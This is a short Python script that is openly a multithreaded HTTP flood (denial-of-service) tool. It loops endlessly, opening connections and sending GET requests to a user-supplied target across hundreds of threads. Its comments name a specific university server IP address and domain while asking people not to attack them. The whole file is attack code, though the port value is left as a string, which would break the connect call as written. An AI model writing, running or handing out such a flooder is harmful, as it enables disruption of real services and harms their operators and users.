#just in case you are using it for eduserver or something please dont
#eduserver IP address = 103.241.136.151

import socket
import threading

print("\n\n\n Dont try this on eduserver or nitc.ac.in please :) \n\n\n ")
target = str(input("Target IP : "))
port = input("port : ")
host= str(input("Host IP : ")) 

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
        s.close()

#threads

n = int(input("No of threads to be used(suggested 500) :"))

for i in range(n):
    thread = threading.Thread(target=attack)
    thread.start()
